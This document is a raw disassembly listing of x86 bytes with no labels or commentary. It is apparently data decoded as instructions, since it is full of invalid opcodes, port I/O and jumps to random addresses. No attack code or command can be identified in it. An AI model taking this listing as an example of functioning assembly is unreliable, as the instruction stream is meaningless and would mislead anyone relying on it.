  42c72a:	call   0x9071a90d
  42c72f:	mov    cl,0x53
  42c731:	fnstenv ds:0x3e719ecf
  42c737:	shr    DWORD PTR [ebp-0x1407a853],0xd
  42c73e:	sub    DWORD PTR [esi-0x61],0x4c
  42c742:	out    dx,al
  42c743:	les    esp,FWORD PTR [ecx]
  42c745:	repz aad 0xb0
  42c748:	in     eax,dx
  42c749:	(bad)  
  42c74b:	xor    dh,BYTE PTR [esi]
  42c74d:	dec    ebx
  42c74e:	mov    al,0x83
  42c750:	sbb    dh,BYTE PTR [esi+ebx*1-0x18b8dcfb]
  42c757:	mov    eax,ds:0x9e43d29f
  42c75c:	xor    DWORD PTR [esi+edx*1-0x31],edx
  42c760:	sbb    esp,DWORD PTR [eax-0x5f]
  42c763:	mov    eax,0x2297eb41
  42c768:	mov    dl,BYTE PTR [esi-0x7f3433c3]
  42c76e:	fs or  ebp,eax
  42c771:	xor    al,0xbe
  42c773:	repnz rcl bh,0xd1
  42c777:	mov    ah,0x25
  42c779:	xor    ch,BYTE PTR [edi]
  42c77b:	in     al,0x12
  42c77d:	stos   DWORD PTR es:[edi],eax
  42c77e:	(bad)  
  42c77f:	sahf   
  42c780:	test   al,bl
  42c782:	(bad)  
  42c783:	ds scas eax,DWORD PTR es:[edi]
  42c785:	xchg   ecx,eax
  42c786:	or     esi,DWORD PTR [edi-0x4]
  42c789:	enter  0x8091,0xb4
  42c78d:	in     al,0x3f
  42c78f:	jno    0x42c7c0
  42c791:	test   BYTE PTR [esi+0x22],dl
  42c794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c795:	sahf   
  42c796:	je     0x42c7c7
  42c798:	xchg   DWORD PTR [edi-0x72],edx
  42c79b:	cmp    eax,0x478e96a3
  42c7a0:	test   DWORD PTR [esp+edx*4-0x5d],edx
  42c7a4:	stos   BYTE PTR es:[edi],al
  42c7a5:	outs   dx,BYTE PTR ds:[esi]
  42c7a6:	scas   al,BYTE PTR es:[edi]
  42c7a7:	data16 lock ins BYTE PTR es:[edi],dx
  42c7aa:	push   ecx
  42c7ab:	inc    ebx
  42c7ac:	xor    al,0x64
  42c7ae:	xchg   bh,bl
  42c7b0:	les    esp,FWORD PTR [edi]
  42c7b2:	pop    ecx
  42c7b3:	xor    ecx,DWORD PTR [ecx+esi*8+0x79]
  42c7b7:	xor    al,0xa
  42c7b9:	jnp    0x42c7f9
  42c7bb:	es pop es
  42c7bd:	mov    ds:0xef9aa975,al
  42c7c2:	retf   0x72bc
  42c7c5:	imul   edx,DWORD PTR [eax],0xffffffa8
  42c7c8:	jno    0x42c77e
  42c7ca:	push   ss
  42c7cb:	jns    0x42c822
  42c7cd:	(bad)  
  42c7ce:	div    ecx
  42c7d0:	xchg   esi,eax
  42c7d1:	adc    BYTE PTR [edi+0x56f38fe5],bh
  42c7d7:	shl    BYTE PTR [ebp+0x0],1
  42c7da:	push   esp
  42c7db:	jae    0x42c7bc
  42c7dd:	icebp  
  42c7de:	ds xchg edx,eax
  42c7e0:	add    eax,0x4fe85dc4
  42c7e5:	pop    ds
  42c7e6:	push   esi
  42c7e7:	pop    ebx
  42c7e8:	fistp  DWORD PTR [ecx-0x3dba5cb8]
	...
  42c856:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c85c:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c862:	sti    
  42c863:	retf   0x6bf6
  42c866:	fld    QWORD PTR [bx+di]
  42c869:	add    BYTE PTR [eax],al
  42c86b:	add    DWORD PTR [eax],eax
  42c86d:	add    ch,dh
  42c86f:	in     al,0xc1
  42c871:	xlat   BYTE PTR ds:[ebx]
  42c872:	or     edx,edx
  42c874:	dec    BYTE PTR [ebx+0x1d853413]
  42c87a:	fadd   QWORD PTR [ecx-0x25]
  42c87d:	pusha  
  42c87e:	(bad)  
  42c87f:	or     DWORD PTR [ebx-0x46],eax
  42c882:	ds leave 
  42c884:	mov    bl,0x4c
  42c886:	(bad)  
  42c887:	xor    BYTE PTR [esi+0x1242b618],dh
  42c88d:	inc    ecx
  42c88e:	adc    bh,BYTE PTR [esi+0x52d0e933]
  42c894:	mov    bh,0x8b
  42c896:	imul   esp,eax,0x22
  42c899:	in     al,dx
  42c89a:	cwde   
  42c89b:	xchg   esp,eax
  42c89c:	xchg   ebp,eax
  42c89d:	pop    eax
  42c89e:	inc    esp
  42c89f:	aaa    
  42c8a0:	cmp    esi,DWORD PTR [edi]
  42c8a2:	mov    ebp,0x97fea94f
  42c8a7:	loopne 0x42c82c
  42c8a9:	fdiv   QWORD PTR [edi+0x366adf80]
  42c8af:	ret    
  42c8b0:	dec    esi
  42c8b1:	xor    ah,BYTE PTR [esi]
  42c8b3:	and    eax,0x28610337
  42c8b8:	mov    eax,edi
  42c8ba:	lds    edx,FWORD PTR [esi]
  42c8bc:	inc    esi
  42c8bd:	fwait
  42c8be:	mov    dh,0xc5
  42c8c0:	mov    edx,DWORD PTR [ebx+0x28d4e85]
  42c8c6:	dec    ebp
  42c8c7:	xchg   edx,eax
  42c8c8:	imul   esp,DWORD PTR [edi-0x7c],0xa0afe3eb
  42c8cf:	cld    
  42c8d0:	aad    0x6c
  42c8d2:	fsub   DWORD PTR [edx-0x52]
  42c8d5:	call   0xb2f9:0xf03b39eb
  42c8dc:	cmp    bl,BYTE PTR cs:[esi+0x9ea2fac]
  42c8e3:	add    dh,al
  42c8e5:	xchg   esp,eax
  42c8e6:	mov    edi,0xd54351f7
  42c8eb:	shl    BYTE PTR [edx],cl
  42c8ed:	addr16 pop es
  42c8ef:	je     0x42c88c
  42c8f1:	inc    BYTE PTR ds:0x91b3d2b6
  42c8f7:	inc    eax
  42c8f8:	push   ebp
  42c8f9:	sub    DWORD PTR [ebx-0x2e45cf0d],esp
  42c8ff:	(bad)  
  42c900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c901:	xchg   edx,eax
  42c902:	call   DWORD PTR [ecx]
  42c904:	imul   eax,DWORD PTR [ecx+0x4ec5c459],0x22
  42c90b:	imul   esp,DWORD PTR [esp+ecx*4],0x47
  42c90f:	jne    0x42c971
  42c911:	push   eax
  42c912:	(bad)  
  42c913:	push   esp
  42c914:	imul   esp,DWORD PTR [esi],0x1536fc29
  42c91a:	xor    al,0x3f
  42c91c:	mov    cl,0xe9
  42c91e:	cmp    eax,0x653d06e9
  42c923:	or     al,dh
  42c925:	xchg   BYTE PTR [ecx-0x16d7e670],al
  42c92b:	in     eax,0x17
  42c92d:	xor    al,0x49
  42c92f:	loop   0x42c8cf
  42c931:	mov    ?,edi
  42c933:	lea    ecx,[esi-0x80]
  42c936:	inc    eax
  42c937:	pop    edi
  42c938:	jle    0x42c92b
  42c93a:	mov    cl,0x25
  42c93c:	daa    
  42c93d:	mov    ds:0xcca4909b,eax
  42c942:	mov    esp,0xb4743c7f
  42c947:	into   
  42c948:	inc    esi
  42c949:	dec    edi
  42c94a:	into   
  42c94b:	dec    ebp
  42c94c:	cdq    
  42c94d:	sub    edx,ecx
  42c94f:	bound  eax,QWORD PTR [esi-0x29040210]
  42c955:	or     eax,DWORD PTR [edx]
  42c957:	adc    DWORD PTR [edi-0x19b8372],0x80da14cb
  42c961:	shl    ebx,0xbc
  42c964:	cs dec edx
  42c966:	jmp    0xda3f016a
  42c96b:	fistp  DWORD PTR [ecx+0x4a]
	...
  42c9d5:	add    BYTE PTR [eax],dl
  42c9d7:	sbb    ecx,ecx
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0xc8c1a8d
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    dl,cl
  42c9ef:	or     eax,0x5be77318
  42c9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9f5:	lods   al,BYTE PTR ds:[esi]
  42c9f6:	mov    dh,0x6d
  42c9f8:	push   edx
  42c9f9:	(bad)  
  42c9fa:	cmp    al,0x89
  42c9fc:	jecxz  0x42ca50
  42c9fe:	mov    bl,0x8e
  42ca00:	xchg   esp,eax
  42ca01:	lods   al,BYTE PTR ds:[esi]
  42ca02:	cmp    eax,0xd906f647
  42ca07:	mov    bh,0xbc
  42ca09:	or     DWORD PTR [edx],ebp
  42ca0b:	adc    BYTE PTR [edi+0x7a1116d6],bh
  42ca11:	push   eax
  42ca12:	cmp    al,0x21
  42ca14:	or     BYTE PTR ds:0x92be274c,ch
  42ca1a:	or     edx,esp
  42ca1c:	push   es
  42ca1d:	mov    gs,WORD PTR [ebx]
  42ca1f:	add    eax,0x1da6ae7
  42ca24:	in     eax,dx
  42ca25:	pop    esi
  42ca26:	dec    ebp
  42ca27:	and    al,0xf2
  42ca29:	rcr    DWORD PTR [esp+esi*1+0x1b],cl
  42ca2d:	mov    edi,0x7150d93d
  42ca32:	mov    al,ds:0xd2491309
  42ca37:	pusha  
  42ca38:	clc    
  42ca39:	ds pop edi
  42ca3b:	jno    0x42ca61
  42ca3d:	dec    edx
  42ca3e:	add    BYTE PTR [ecx],0x36
  42ca41:	(bad)  
  42ca42:	pop    edi
  42ca43:	xchg   edx,eax
  42ca44:	jg     0x42ca9e
  42ca46:	adc    edx,esp
  42ca48:	push   0x23
  42ca4a:	pop    ebx
  42ca4b:	mov    ecx,edi
  42ca4d:	or     eax,DWORD PTR [edx-0x54]
  42ca50:	or     eax,0xdc73d1df
  42ca55:	xor    eax,0x91323fc4
  42ca5a:	jl     0x42c9e5
  42ca5c:	out    dx,eax
  42ca5d:	int    0xe8
  42ca5f:	inc    ebx
  42ca60:	dec    esi
  42ca61:	stos   DWORD PTR es:[edi],eax
  42ca62:	pop    edx
  42ca63:	ds cmc 
  42ca65:	jl     0x42ca87
  42ca67:	pop    edx
  42ca68:	pop    eax
  42ca69:	ds es xor esi,eax
  42ca6d:	rcr    esi,0xcd
  42ca70:	add    eax,0x210a6f4d
  42ca75:	fcomi  st,st(6)
  42ca77:	xor    al,0x73
  42ca79:	jl     0x42ca1a
  42ca7b:	xchg   ebp,eax
  42ca7c:	sti    
  42ca7d:	stos   DWORD PTR es:[edi],eax
  42ca7e:	add    DWORD PTR [ebp+0x4e],0xffffffa5
  42ca82:	int3   
  42ca83:	jae    0x42caed
  42ca85:	fucomi st,st(3)
  42ca87:	xor    eax,0x11abafb
  42ca8c:	popa   
  42ca8d:	addr16 mov esp,0x47fa578a
  42ca93:	add    eax,0x6b62c16b
  42ca98:	xor    eax,0xbca316bd
  42ca9d:	loope  0x42caa2
  42ca9f:	sub    al,0x97
  42caa1:	scas   al,BYTE PTR es:[edi]
  42caa2:	mov    ds:0xf9958825,al
  42caa7:	jmp    0x9f08a6a
  42caac:	pop    es
  42caad:	adc    ecx,eax
  42caaf:	pop    esp
  42cab0:	repz cmc 
  42cab2:	fcos   
  42cab4:	xchg   ebx,eax
  42cab5:	jo     0x42ca71
  42cab7:	std    
  42cab8:	cmc    
  42cab9:	jg     0x42cb0c
  42cabb:	dec    esp
  42cabc:	mov    bh,0x6a
  42cabe:	jecxz  0x42ca7d
  42cac0:	push   edi
  42cac1:	pop    esp
  42cac2:	adc    dl,BYTE PTR [ecx-0xcfc74cb]
  42cac8:	mov    esi,0x89b3e69
  42cacd:	jbe    0x42cae5
  42cacf:	inc    ecx
  42cad0:	and    DWORD PTR [edi+0x5e],ebx
  42cad3:	dec    edi
  42cad4:	push   esp
  42cad5:	push   eax
  42cad6:	cmp    ecx,DWORD PTR [eax]
  42cad8:	push   0xfffffff2
  42cada:	ins    DWORD PTR es:[edi],dx
  42cadb:	jb     0x42cb5a
  42cadd:	sub    DWORD PTR [edx+0x2e],eax
  42cae0:	cmp    ebx,0x3122941d
  42cae6:	lods   eax,DWORD PTR ds:[esi]
  42cae7:	mov    ds:0xed3ba344,eax
  42caec:	loope  0x42cb5d
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x7e419140]
  42cb64:	cwde   
  42cb65:	aam    0x67
  42cb67:	fild   WORD PTR [ecx]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    al,al
  42cb6f:	das    
  42cb70:	cli    
  42cb71:	nop
  42cb72:	ins    DWORD PTR es:[edi],dx
  42cb73:	push   ds
  42cb74:	xchg   DWORD PTR [ebx-0x7e],esi
  42cb77:	(bad)  
  42cb78:	pop    eax
  42cb79:	into   
  42cb7a:	inc    ebx
  42cb7b:	inc    ebp
  42cb7c:	fidivr WORD PTR [esi]
  42cb7e:	mov    esp,0x6bfcf14b
  42cb83:	push   ds
  42cb84:	pusha  
  42cb85:	adc    al,0xd4
  42cb87:	jp     0x42cbc7
  42cb89:	pop    ecx
  42cb8a:	retf   
  42cb8b:	dec    esi
  42cb8c:	cdq    
  42cb8d:	xchg   cl,bl
  42cb8f:	stos   DWORD PTR es:[edi],eax
  42cb90:	mov    ecx,0x1369bdd6
  42cb95:	pop    ds
  42cb96:	adc    eax,0xc4250261
  42cb9b:	popa   
  42cb9c:	push   es
  42cb9d:	inc    eax
  42cb9e:	hlt    
  42cb9f:	jl     0x42cc19
  42cba1:	loope  0x42cb36
  42cba3:	sti    
  42cba4:	add    bl,0xd7
  42cba7:	out    dx,al
  42cba8:	push   esp
  42cba9:	test   al,0xbc
  42cbab:	(bad)  
  42cbad:	retf   0x956f
  42cbb0:	ss cmp al,0xde
  42cbb3:	popf   
  42cbb4:	out    dx,eax
  42cbb5:	das    
  42cbb6:	xchg   DWORD PTR [edx+ebp*1+0x15],ebp
  42cbba:	stos   DWORD PTR es:[edi],eax
  42cbbb:	rcr    DWORD PTR [ebx-0x46c0826],cl
  42cbc1:	lahf   
  42cbc2:	mov    cl,0x2
  42cbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cbc5:	xor    dl,BYTE PTR [ecx]
  42cbc7:	push   ebx
  42cbc8:	aad    0x52
  42cbca:	or     DWORD PTR [edi+eiz*2-0x4b92244c],ecx
  42cbd1:	adc    eax,DWORD PTR [ebx+0x4f]
  42cbd4:	ins    BYTE PTR es:[edi],dx
  42cbd5:	mov    gs,esp
  42cbd7:	jae    0x42cb7b
  42cbd9:	push   ebp
  42cbda:	xchg   BYTE PTR [edi+0x42582292],bl
  42cbe0:	repnz call 0x91db:0xd0f4f60c
  42cbe8:	add    al,0x6d
  42cbea:	jbe    0x42cbc5
  42cbec:	imul   BYTE PTR [ebp+0xe]
  42cbef:	sbb    al,0x70
  42cbf1:	mov    ds:0x7ab9e1f4,al
  42cbf6:	push   ds
  42cbf7:	and    bh,ah
  42cbf9:	pop    ebp
  42cbfa:	adc    eax,DWORD PTR [esi+0x38]
  42cbfd:	shl    BYTE PTR [ebx+edx*8+0x47],0x5
  42cc02:	mov    eax,DWORD PTR ds:0x6c184efe
  42cc08:	bound  edx,QWORD PTR [edx]
  42cc0a:	pop    esp
  42cc0b:	dec    esi
  42cc0c:	sbb    al,0xda
  42cc0e:	in     al,0xca
  42cc10:	inc    edx
  42cc11:	shr    DWORD PTR [esi+edi*8+0x77],cl
  42cc15:	jge    0x42cc91
  42cc17:	rcl    BYTE PTR [edi],cl
  42cc19:	xchg   BYTE PTR [eax-0x61690ebf],ch
  42cc1f:	bound  ebx,QWORD PTR [ecx-0x24]
  42cc22:	test   BYTE PTR [ebp-0x18],0x13
  42cc26:	in     eax,dx
  42cc27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc28:	and    al,BYTE PTR [edi-0x7f760f9d]
  42cc2e:	xor    ah,ch
  42cc30:	clc    
  42cc31:	bnd ret 
  42cc33:	enter  0xcd67,0x96
  42cc37:	cmp    BYTE PTR [edx+esi*1+0x14199693],dh
  42cc3e:	pop    esi
  42cc3f:	imul   eax,ecx,0x8322692d
  42cc45:	outs   dx,DWORD PTR ds:[esi]
  42cc46:	not    DWORD PTR [edx-0x2]
  42cc49:	imul   esp,DWORD PTR [esi+edi*4+0x4e],0x78
  42cc4e:	pusha  
  42cc4f:	out    0x1,eax
  42cc51:	xor    DWORD PTR [esi+0x5a],0x6e
  42cc55:	jns    0x42ccca
  42cc57:	out    0x10,al
  42cc59:	adc    dl,BYTE PTR [edx]
  42cc5b:	aas    
  42cc5c:	and    DWORD PTR [eax-0x1859d9a3],eax
  42cc62:	inc    ecx
  42cc63:	retf   
  42cc64:	dec    ebx
  42cc65:	mov    al,0xe3
  42cc67:	or     eax,0x7dc3189
  42cc6c:	xchg   edx,eax
  42cc6d:	sub    DWORD PTR [eax],eax
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0xd4a80ad9
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ebp+0x29],ch
  42ccf0:	enter  0xd2d7,0x2a
  42ccf4:	inc    ebp
  42ccf5:	inc    edi
  42ccf6:	mov    cl,0x28
  42ccf8:	inc    edx
  42ccf9:	ficom  WORD PTR [esi+0x41]
  42ccfc:	push   eax
  42ccfd:	sub    esi,0xe2fed202
  42cd03:	add    al,0xd7
  42cd05:	jb     0x42ccb7
  42cd07:	sti    
  42cd08:	adc    eax,0xc7708284
  42cd0d:	(bad)  
  42cd0f:	xchg   esp,eax
  42cd10:	pop    edx
  42cd11:	ja     0x42cd52
  42cd13:	sbb    ch,BYTE PTR [edx+0x3d31b0a3]
  42cd19:	mov    edx,eax
  42cd1b:	xlat   BYTE PTR ds:[ebx]
  42cd1c:	outs   dx,BYTE PTR ds:[esi]
  42cd1d:	jl     0x42cca0
  42cd1f:	or     eax,0xa773bde4
  42cd24:	sbb    al,0x89
  42cd26:	xor    esi,DWORD PTR [ebp-0x5]
  42cd29:	stos   BYTE PTR es:[edi],al
  42cd2a:	bound  ecx,QWORD PTR [ecx+0x11]
  42cd2d:	fild   DWORD PTR ds:0x6469a98f
  42cd33:	add    eax,0xaea702a1
  42cd38:	sub    ecx,esp
  42cd3a:	mov    esp,0xf3d335a1
  42cd3f:	push   ecx
  42cd40:	shl    BYTE PTR [edx+eiz*1],1
  42cd43:	scas   al,BYTE PTR es:[edi]
  42cd44:	lods   al,BYTE PTR ds:[esi]
  42cd45:	dec    ecx
  42cd46:	pusha  
  42cd47:	loopne 0x42ccdc
  42cd49:	retf   
  42cd4a:	and    bl,BYTE PTR [edx-0x66b06fb4]
  42cd50:	mov    fs,WORD PTR ds:0xfa7dc89d
  42cd56:	jno    0x42cda3
  42cd58:	xchg   esp,eax
  42cd59:	jo     0x42cce1
  42cd5b:	mov    eax,ds:0xf175a2e8
  42cd60:	sub    BYTE PTR [ebp+0x5df4f423],al
  42cd66:	(bad)  
  42cd67:	(bad)  
  42cd68:	loop   0x42cdb6
  42cd6a:	sahf   
  42cd6b:	(bad)  
  42cd6c:	cli    
  42cd6d:	sub    al,0xc6
  42cd6f:	jg     0x42cd33
  42cd71:	icebp  
  42cd72:	and    al,0x22
  42cd74:	xlat   BYTE PTR ds:[ebx]
  42cd75:	sahf   
  42cd76:	mov    ebx,0xcaf78142
  42cd7b:	adc    eax,0x9f1fbe84
  42cd80:	mov    DWORD PTR ds:0x22a234b9,edx
  42cd86:	imul   esp,DWORD PTR [esi+0x54f83beb],0x55
  42cd8d:	or     al,0x1b
  42cd8f:	test   DWORD PTR [ebp-0x73],ecx
  42cd92:	and    eax,0xd26f02ff
  42cd97:	loopne 0x42cd88
  42cd99:	es iret 
  42cd9b:	add    al,bl
  42cd9d:	call   0xfd513ce8
  42cda2:	pop    ebx
  42cda3:	fisubr WORD PTR [edi-0x42]
  42cda6:	jge    0x42cd2f
  42cda8:	pop    ss
  42cda9:	les    eax,FWORD PTR [edi-0x10c404f9]
  42cdaf:	pusha  
  42cdb0:	add    ah,BYTE PTR [eax-0x74]
  42cdb3:	jmp    0x42cd70
  42cdb5:	mov    ds:0x60aa6da8,al
  42cdba:	xchg   ebp,eax
  42cdbb:	mov    ah,0xe
  42cdbd:	push   es
  42cdbe:	aaa    
  42cdbf:	xchg   esi,eax
  42cdc0:	(bad)  
  42cdc2:	fldenv [edx+0x3e9f946f]
  42cdc8:	pop    ds
  42cdc9:	ret    
  42cdca:	mov    al,ds:0x33eeb4f1
  42cdcf:	or     esp,DWORD PTR [ecx+edi*1]
  42cdd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cdd3:	jo     0x42cdad
  42cdd5:	clc    
  42cdd6:	mov    ah,0x7c
  42cdd8:	test   BYTE PTR [ecx-0x65fc4caf],ch
  42cdde:	pop    eax
  42cddf:	arpl   WORD PTR [esi-0x5e7b75e6],bx
  42cde5:	jne    0x42cd7a
  42cde7:	mov    edx,0xabe69376
  42cdec:	sbb    DWORD PTR gs:[eax],eax
	...
  42ce53:	add    BYTE PTR [eax],al
  42ce55:	add    BYTE PTR [ecx],bl
  42ce57:	mov    eax,ds:0xdffe87fe
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xdd
  42ce63:	push   edi
  42ce64:	jg     0x42ce5e
  42ce66:	addr16 loope 0x42ce6a
  42ce69:	add    BYTE PTR [eax],al
  42ce6b:	add    DWORD PTR [eax],eax
  42ce6d:	add    BYTE PTR [ebp+0x2a],cl
  42ce70:	in     eax,dx
  42ce71:	push   ds
  42ce72:	sbb    eax,0x2aafbb59
  42ce77:	lods   al,BYTE PTR ds:[esi]
  42ce78:	stos   BYTE PTR es:[edi],al
  42ce79:	xlat   BYTE PTR ds:[bx]
  42ce7b:	div    DWORD PTR [ecx+0x46]
  42ce7e:	test   bl,0x32
  42ce81:	retf   0x6bca
  42ce84:	pop    eax
  42ce85:	std    
  42ce86:	lea    esp,[ebp-0x7f9b47e7]
  42ce8c:	or     DWORD PTR [edx],edi
  42ce8e:	stc    
  42ce8f:	and    al,0xa5
  42ce91:	pop    esi
  42ce92:	sbb    BYTE PTR [esi-0x6e],cl
  42ce95:	xchg   edi,eax
  42ce96:	lods   al,BYTE PTR ds:[esi]
  42ce97:	cmp    esi,edi
  42ce99:	lahf   
  42ce9a:	je     0x42ce5b
  42ce9c:	dec    esi
  42ce9d:	rcr    BYTE PTR [eax],0xd7
  42cea0:	push   ss
  42cea1:	out    0x93,al
  42cea3:	or     al,0xf2
  42cea5:	repz pusha 
  42cea7:	mov    bh,BYTE PTR [edi]
  42cea9:	fdiv   DWORD PTR [esi-0x45]
  42ceac:	rcl    BYTE PTR [edi+0x1a],0x1f
  42ceb0:	test   BYTE PTR [edx],ch
  42ceb2:	adc    cl,BYTE PTR [edx]
  42ceb4:	sub    al,0xe7
  42ceb6:	iret   
  42ceb7:	push   es
  42ceb8:	adc    DWORD PTR [ebx+0x64ad1d56],edx
  42cebe:	sbb    edi,0xb403883c
  42cec4:	pop    esp
  42cec5:	sub    DWORD PTR [ebx+0x7595305f],esi
  42cecb:	and    bh,BYTE PTR [ecx-0x13cf7975]
  42ced1:	mov    eax,0x33c5c55f
  42ced6:	cmp    DWORD PTR [esi+0x3a3f730c],esi
  42cedc:	sub    BYTE PTR [ebx-0x40],ah
  42cedf:	jle    0x42cf0b
  42cee1:	mov    ?,eax
  42cee3:	and    eax,0xc70de067
  42cee8:	or     DWORD PTR [edx-0x58],esi
  42ceeb:	adc    esp,0xffffffcf
  42ceee:	pop    ss
  42ceef:	cs stos DWORD PTR es:[edi],eax
  42cef1:	push   esi
  42cef2:	sbb    DWORD PTR [eax],esp
  42cef4:	mov    al,0xdb
  42cef6:	push   ebx
  42cef7:	lea    ecx,[eax-0x64]
  42cefa:	fdivr  st(6),st
  42cefc:	loopne 0x42cf35
  42cefe:	ins    BYTE PTR es:[edi],dx
  42ceff:	cmp    ecx,ebx
  42cf01:	mov    ebx,0x986ae7db
  42cf06:	jp     0x42cf1d
  42cf08:	scas   eax,DWORD PTR es:[edi]
  42cf09:	aaa    
  42cf0a:	jmp    0x22d8:0x22d66cdd
  42cf11:	mov    ah,0x5a
  42cf13:	xor    al,al
  42cf15:	adc    DWORD PTR [edi+ecx*4+0x6a],ecx
  42cf19:	sbb    ebx,edx
  42cf1b:	mov    dl,0xd9
  42cf1d:	sti    
  42cf1e:	xor    BYTE PTR [esi+0x7893d26d],ch
  42cf24:	stc    
  42cf25:	sbb    al,0x92
  42cf27:	and    eax,0x18a2b814
  42cf2c:	fldcw  WORD PTR [eax-0x5fc64d94]
  42cf32:	rcl    BYTE PTR [ecx+edx*4-0x79fc3ef8],0xae
  42cf3a:	enter  0x3333,0xcb
  42cf3e:	sub    esp,eax
  42cf40:	inc    edx
  42cf41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf42:	xor    eax,0x5ae0a55f
  42cf47:	sahf   
  42cf48:	es push ebx
  42cf4a:	dec    edx
  42cf4b:	sbb    DWORD PTR [eax-0x57],esp
  42cf4e:	fdivr  DWORD PTR [ecx]
  42cf50:	mov    DWORD PTR [edi-0x21],0x4bf0adf5
  42cf57:	push   esp
  42cf58:	cmc    
  42cf59:	dec    esi
  42cf5a:	je     0x42cf24
  42cf5c:	or     dl,al
  42cf5e:	and    ebx,DWORD PTR [esi-0x1681d5d]
  42cf64:	pusha  
  42cf65:	or     DWORD PTR [edi-0x45],esi
  42cf68:	jmp    0x64:0x9f41076a
	...
  42cfd3:	add    BYTE PTR [eax],al
  42cfd5:	add    BYTE PTR [ebx+0x3d],dh
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    edx,FWORD PTR [edi]
  42cfe3:	outs   dx,BYTE PTR ds:[esi]
  42cfe4:	fsub   DWORD PTR [edi+eiz*2]
  42cfe7:	loop   0x42cfea
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [edx],bh
  42cfef:	sub    DWORD PTR [edx],edi
  42cff1:	and    al,0x42
  42cff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cff4:	lds    ebx,FWORD PTR [ebp-0xf]
  42cff7:	adc    esi,DWORD PTR [ecx]
  42cff9:	stos   DWORD PTR es:[edi],eax
  42cffa:	aas    
  42cffb:	ds cmc 
  42cffd:	and    DWORD PTR [ecx-0x46bab57a],esi
  42d003:	repz sub ah,dh
  42d006:	das    
  42d007:	add    cl,0xc1
  42d00a:	cdq    
  42d00b:	mov    dl,0x63
  42d00d:	ja     0x42cfae
  42d00f:	enter  0x314b,0x7f
  42d013:	in     al,dx
  42d014:	push   ebp
  42d015:	cdq    
  42d016:	push   esi
  42d017:	into   
  42d018:	loopne 0x42cfd4
  42d01a:	imul   ebp,DWORD PTR [edx-0x50750fa2],0x55ff72ed
  42d024:	ja     0x42d08b
  42d026:	mov    bl,0x28
  42d028:	adc    BYTE PTR [ebp+0x71e7daa3],dh
  42d02e:	pop    esp
  42d02f:	fistp  DWORD PTR [ecx+0x68]
  42d032:	jecxz  0x42d05d
  42d034:	repz mov esp,0x10fa692f
  42d03a:	mov    al,0xee
  42d03c:	mov    ecx,0x30215de9
  42d041:	data16 adc BYTE PTR [ecx-0x54f5f39f],ch
  42d048:	dec    esi
  42d049:	add    DWORD PTR [eax+ebp*8+0x62ac7e7e],ecx
  42d050:	in     eax,dx
  42d051:	lods   al,BYTE PTR ds:[esi]
  42d052:	mov    edx,0x2f922dc8
  42d057:	cdq    
  42d058:	loopne 0x42d033
  42d05a:	add    BYTE PTR [eax-0x4da69d66],cl
  42d060:	push   edx
  42d061:	(bad)  
  42d062:	sub    BYTE PTR [ecx-0x7c],bl
  42d065:	jne    0x42d02a
  42d067:	mov    BYTE PTR [esi+0x228ca8e7],al
  42d06d:	pop    esp
  42d06e:	jp     0x42d006
  42d070:	cs jl  0x42d001
  42d073:	bound  esp,QWORD PTR [edx]
  42d075:	xor    al,0x9c
  42d077:	push   eax
  42d078:	add    ah,BYTE PTR [ebx+ebx*1-0xf78b529]
  42d07f:	mov    eax,ds:0x4fd9ca36
  42d084:	(bad)  
  42d085:	idiv   BYTE PTR [esi-0x71]
  42d088:	jl     0x42d00e
  42d08a:	or     BYTE PTR [edi+0x1c85ef74],0xcc
  42d091:	(bad)  
  42d092:	sbb    esp,DWORD PTR [esi]
  42d094:	mov    cs,WORD PTR [edx+0x7fdda364]
  42d09a:	mov    ds:0xfed973f5,eax
  42d09f:	inc    ecx
  42d0a0:	mov    dh,0xd4
  42d0a2:	aas    
  42d0a3:	imul   edx,DWORD PTR [esi+eiz*1],0xffffff97
  42d0a7:	jmp    0x42d02a
  42d0a9:	xchg   ebx,eax
  42d0aa:	inc    ebx
  42d0ab:	je     0x42d122
  42d0ad:	mov    edi,DWORD PTR [edi+eax*4]
  42d0b0:	pop    ebp
  42d0b1:	inc    edi
  42d0b2:	(bad)  
  42d0b3:	pop    eax
  42d0b4:	mov    ds:0x14a6a69f,al
  42d0b9:	ins    BYTE PTR es:[edi],dx
  42d0ba:	aas    
  42d0bb:	cld    
  42d0bc:	jne    0x42d05e
  42d0be:	pop    esp
  42d0bf:	dec    edx
  42d0c0:	xor    DWORD PTR [esi],0xc8f4e8d4
